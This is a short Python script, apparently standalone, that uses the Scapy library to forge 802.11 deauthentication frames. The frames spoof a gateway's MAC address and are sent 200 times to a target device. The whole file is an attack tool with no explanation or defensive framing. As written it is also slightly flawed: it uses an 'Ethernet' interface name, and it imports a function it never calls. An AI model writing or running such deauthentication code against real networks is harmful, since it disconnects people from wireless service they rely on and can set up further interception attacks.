from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp, getmacbyip

def deauth(target_mac, gateway_mac):
    # addr1: target MAC
    # addr2: source MAC
    # addr3: access point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    sendp(packet, inter=0.1, count=200, iface='Ethernet')


if __name__ == '__main__':
    deauth('ex:am:pl:em:ac', 'ex:am:pl:em:ac')